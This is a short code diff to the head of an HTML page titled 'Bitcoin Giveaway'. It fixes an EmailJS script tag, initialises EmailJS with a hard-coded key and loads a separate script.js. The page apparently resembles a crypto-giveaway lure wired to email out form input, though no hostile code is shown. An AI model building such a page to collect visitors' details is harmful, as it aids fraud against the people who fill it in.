@@ -5,8 +5,18 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bitcoin Giveaway</title>
     <link rel="stylesheet" href="styles.css">
-    <script type="text/javascript"
-        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+
+    <!-- Include the latest EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    
+    <!-- Initialize EmailJS with your public key -->
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("kL8LldtVITo1oHfSk"); // Replace with your public EmailJS key
+        })();
+    </script>
+
+    <script defer src="script.js"></script>
 </head>
 <body>
 
